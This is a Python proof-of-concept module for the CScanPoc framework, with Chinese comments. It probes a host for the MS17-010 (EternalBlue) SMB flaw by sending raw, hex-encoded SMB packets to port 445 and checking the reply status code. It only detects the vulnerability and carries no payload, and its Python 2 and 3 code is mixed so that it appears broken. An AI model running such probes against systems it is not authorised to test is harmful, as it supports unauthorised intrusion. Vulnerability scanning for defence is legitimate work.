# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import socket
import binascii
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'MS17_010'  # 平台漏洞编号
    name = 'MS17-010 SMB远程溢出'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-07-11'  # 漏洞公布时间
    desc = '''
        MS17-010（NSA Eternalblue SMB），攻击者可通过此漏洞执行任意代码，进而导致服务器被入侵控制。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/42315/'  # https://www.exploit-db.com/exploits/42315/
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2017-0144 '  # cve编号
    product = 'Microsoft-Windows-Business-Server'  # 漏洞组件名称
    product_version = 'Windows Vista、Windows Server 2008、Windows 7、Windows Server 2008 R2、Windows 8.1、Windows Server 2012 and Windows Server 2012 R2、Windows RT 8.1、Windows 10、Windows Server 2016'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0e55cb86-c14f-43fb-b3c1-020707bd6222'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        negotiate_protocol_request = binascii.unhexlify(
            "00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
        session_setup_request = binascii.unhexlify(
            "00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = urllib.parse.urlparse(arg)
            timeout = 10
            ip = socket.gethostbyname(url.hostname)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, 445))
            s.send(negotiate_protocol_request)
            s.recv(1024)
            s.send(session_setup_request)
            data = s.recv(1024)
            user_id = data[32:34]
            tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % (
                (58 + len(ip)), user_id.encode('hex'), ip.encode('hex'))
            s.send(binascii.unhexlify(tree_connect_andx_request))
            data = s.recv(1024)
            allid = data[28:36]
            payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00" % allid.encode(
                'hex')
            s.send(binascii.unhexlify(payload))
            data = s.recv(1024)
            s.close()
            if "\x05\x02\x00\xc0" in data:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            s.close()

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
